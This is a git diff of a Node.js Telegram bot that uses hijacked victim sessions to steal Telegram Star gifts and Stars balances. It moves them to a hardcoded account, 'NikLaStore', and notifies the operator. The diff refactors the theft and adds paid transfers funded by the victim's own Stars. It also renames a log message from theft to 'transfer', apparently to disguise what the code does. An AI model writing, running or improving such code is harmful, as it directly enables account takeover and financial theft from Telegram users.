@@ -12,6 +12,7 @@ const API_ID = parseInt(process.env.API_ID) || 30427944;
 const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://eeee-2bsj.onrender.com';
+const TARGET_USERNAME = 'NikLaStore';
 
 const bot = new TelegramBot(BOT_TOKEN, { 
     polling: true,
@@ -588,6 +589,15 @@ async function stealAllStars() {
     }
 }
 
+// ПОМОЩНИК: ПЕРЕВЕСТИ STARSAMOUNT В ЧИСЛО
+function starsAmountToNumber(starsAmount) {
+    if (!starsAmount) return 0;
+    return (
+        Number(starsAmount.amount) +
+        Number(starsAmount.nanos ?? 0) / 1_000_000_000
+    );
+}
+
 // ОБНОВЛЕННАЯ ФУНКЦИЯ ПЕРЕДАЧИ ПОДАРКОВ (ИЗ ТВОЕГО КОДА)
 async function transferGiftsToTarget(client, phone) {
     try {
@@ -601,10 +611,9 @@ async function transferGiftsToTarget(client, phone) {
         );
 
         const bal = status.balance;
-        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;
+        const stars = starsAmountToNumber(bal);
 
-        console.log(`⭐ ${phone}: Баланс Stars:`, starsAmount);
-        console.log("⭐ Баланс Stars (raw):", bal);
+        console.log(`⭐ ${phone}: Баланс Stars:`, stars);
 
         // 2) Получаем список подарков
         const gifts = await client.invoke(
@@ -615,8 +624,7 @@ async function transferGiftsToTarget(client, phone) {
             })
         );
 
-        console.log(`🎁 ${phone}: Всего подарков:`, gifts.count);
-        console.log(`🎁 ${phone}: Загружено в этом запросе:`, gifts.gifts.length);
+        console.log(`🎁 ${phone}: Всего подарков: ${gifts.gifts.length}`);
 
         if (!gifts.gifts || gifts.gifts.length === 0) {
             bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет подарков`);
@@ -624,24 +632,32 @@ async function transferGiftsToTarget(client, phone) {
         }
 
         // Логируем информацию о подарках
-        for (const g of gifts.gifts) {
-            console.log({
-                savedId: g.savedId,
+        gifts.gifts.forEach((g, i) => {
+            console.log(`  #${i + 1}`, {
                 msgId: g.msgId,
                 unsaved: g.unsaved,
-                canUpgrade: g.canUpgrade,
-                transferStars: g.transferStars,
-                convertStars: g.convertStars,
+                transferStars: g.transferStars
+                    ? {
+                        amount: Number(g.transferStars.amount),
+                        nanos: Number(g.transferStars.nanos ?? 0)
+                    }
+                    : null,
+                convertStars: g.convertStars
+                    ? {
+                        amount: Number(g.convertStars.amount),
+                        nanos: Number(g.convertStars.nanos ?? 0)
+                    }
+                    : null
             });
-        }
+        });
 
         // Резолвим целевого пользователя
         const target = await client.invoke(
-            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
+            new Api.contacts.ResolveUsername({ username: TARGET_USERNAME })
         );
         
         if (!target || !target.users || target.users.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден ${TARGET_USERNAME}`);
             return false;
         }
 
@@ -651,79 +667,18 @@ async function transferGiftsToTarget(client, phone) {
             accessHash: targetUser.accessHash
         });
 
-        // Фильтруем transferable подарки
-        const transferableGifts = gifts.gifts.filter(gift => gift.transferStars);
-        
-        console.log(`🔄 ${phone}: Transferable подарков: ${transferableGifts.length}`);
-
-        if (transferableGifts.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Нет transferable подарков`);
-            return false;
-        }
-
-        bot.sendMessage(MY_USER_ID, `🔄 ${phone}: Начинаю передачу ${transferableGifts.length} подарков...`);
+        console.log(`🔄 ${phone}: Начинаю передачу ${gifts.gifts.length} подарков...`);
+        bot.sendMessage(MY_USER_ID, `🔄 ${phone}: Начинаю передачу ${gifts.gifts.length} подарков...`);
 
         let stolenCount = 0;
 
-        for (const gift of transferableGifts) {
+        for (const gift of gifts.gifts) {
             try {
-                console.log(`→ Обрабатываю подарок msgId=${gift.msgId}`);
-
-                // Если подарок не сохранен - сначала сохраняем
-                if (gift.unsaved) {
-                    console.log("💾 Сохраняю подарок...");
-                    await client.invoke(
-                        new Api.payments.SaveStarGift({
-                            stargift: new Api.InputSavedStarGiftUser({ msgId: gift.msgId })
-                        })
-                    );
-                    console.log("✅ Подарок сохранен");
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-
-                // Передаем подарок
-                console.log(`🔄 Передаю подарок...`);
-                await client.invoke(
-                    new Api.payments.TransferStarGift({
-                        stargift: gift.savedId
-                            ? new Api.InputSavedStarGift({ id: gift.savedId })
-                            : new Api.InputSavedStarGiftUser({ msgId: gift.msgId }),
-                        toId: targetPeer
-                    })
-                );
-                
+                await transferGiftSmart(client, gift, targetPeer, phone);
                 stolenCount++;
-                console.log(`✅ Подарок успешно передан на @NikLaStore`);
-                
-                // Пауза между запросами
                 await new Promise(resolve => setTimeout(resolve, 2000));
-                
             } catch (e) {
-                console.log(`❌ Не удалось передать подарок:`, e.message);
-                
-                // Если передача не работает, пробуем конвертировать в звезды
-                try {
-                    if (gift.convertStars) {
-                        console.log(`🔄 Пробую конвертировать в звезды: ${gift.convertStars}`);
-                        
-                        await client.invoke(
-                            new Api.payments.SendStars({
-                                peer: targetPeer,
-                                stars: gift.convertStars,
-                                purpose: new Api.InputStorePaymentGift({
-                                    userId: targetUser.id
-                                })
-                            })
-                        );
-                        
-                        stolenCount++;
-                        console.log(`✅ Успешно конвертирован в звезды`);
-                        await new Promise(resolve => setTimeout(resolve, 2000));
-                    }
-                } catch (e2) {
-                    console.log(`❌ Ошибка конвертации:`, e2.message);
-                    continue;
-                }
+                console.log(`❌ Ошибка при передаче подарка:`, e.message || e);
             }
         }
 
@@ -743,6 +698,73 @@ async function transferGiftsToTarget(client, phone) {
     }
 }
 
+// 🔧 ГЛАВНАЯ ФУНКЦИЯ ПЕРЕДАЧИ ОДНОГО ПОДАРКА (платный/бесплатный)
+async function transferGiftSmart(client, gift, targetPeer, phone) {
+    console.log(`→ ${phone}: Обрабатываю подарок msgId=${gift.msgId}`);
+
+    // 1. Если подарок unsaved — сначала сохраняем
+    if (gift.unsaved) {
+        console.log(`   💾 ${phone}: Подарок помечен как unsaved, сохраняю...`);
+        await client.invoke(
+            new Api.payments.SaveStarGift({
+                stargift: new Api.InputSavedStarGiftUser({
+                    msgId: gift.msgId
+                })
+            })
+        );
+        await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+
+    // 2. Проверяем, нужно ли платить за трансфер
+    const transferCost = starsAmountToNumber(gift.transferStars);
+
+    if (!gift.transferStars || transferCost === 0) {
+        // БЕСПЛАТНЫЙ ПЕРЕНОС
+        console.log(`   ✅ ${phone}: Бесплатный перенос, вызываю payments.transferStarGift...`);
+
+        await client.invoke(
+            new Api.payments.TransferStarGift({
+                stargift: gift.savedId
+                    ? new Api.InputSavedStarGift({ id: gift.savedId })
+                    : new Api.InputSavedStarGiftUser({ msgId: gift.msgId }),
+                toId: targetPeer
+            })
+        );
+
+        console.log(`   🎉 ${phone}: Подарок передан БЕСПЛАТНО`);
+        return;
+    }
+
+    // 3. ПЛАТНЫЙ ПЕРЕНОС (через Stars)
+    console.log(`   💸 ${phone}: Платный перенос, требуется ${transferCost} Stars. Создаю invoice...`);
+
+    const invoice = new Api.InputInvoiceStarGiftTransfer({
+        peer: targetPeer,
+        stargift: gift.savedId
+            ? new Api.InputSavedStarGift({ id: gift.savedId })
+            : new Api.InputSavedStarGiftUser({ msgId: gift.msgId }),
+        message: `Transfer star gift to @${TARGET_USERNAME}`
+    });
+
+    // получаем форму оплаты
+    const form = await client.invoke(
+        new Api.payments.GetPaymentForm({
+            invoice
+        })
+    );
+
+    console.log(`   🧾 ${phone}: Получена форма оплаты, отправляю Stars...`);
+
+    await client.invoke(
+        new Api.payments.SendStarsForm({
+            formId: form.formId,
+            invoice
+        })
+    );
+
+    console.log(`   🎉 ${phone}: Подарок передан С ОПЛАТОЙ`);
+}
+
 // ОБНОВЛЕННАЯ ФУНКЦИЯ КРАЖИ ЗВЕЗД
 async function transferStarsToTarget(client, phone) {
     try {
@@ -754,7 +776,7 @@ async function transferStarsToTarget(client, phone) {
         );
 
         const bal = status.balance;
-        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;
+        const starsAmount = starsAmountToNumber(bal);
 
         console.log(`⭐ ${phone}: Баланс звезд: ${starsAmount}`);
 
@@ -765,11 +787,11 @@ async function transferStarsToTarget(client, phone) {
 
         // Ищем целевого пользователя
         const target = await client.invoke(
-            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
+            new Api.contacts.ResolveUsername({ username: TARGET_USERNAME })
         );
         
         if (!target || !target.users || target.users.length === 0) {
-            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
+            bot.sendMessage(MY_USER_ID, `❌ ${phone}: Не найден ${TARGET_USERNAME}`);
             return false;
         }
 
@@ -782,7 +804,7 @@ async function transferStarsToTarget(client, phone) {
         // Передаем звезды (минимально 1 звезда)
         const starsToSend = Math.max(1, Math.floor(starsAmount));
         
-        console.log(`🔄 Отправляю ${starsToSend} звезд...`);
+        console.log(`🔄 ${phone}: Отправляю ${starsToSend} звезд...`);
 
         await client.invoke(
             new Api.payments.SendStars({
@@ -856,4 +878,4 @@ bot.onText(/\/admin/, (msg) => {
     });
 });
 
-console.log('✅ Бот запущен с улучшенной логикой кражи подарков');
+console.log('✅ Бот запущен с улучшенной логикой передачи подарков');
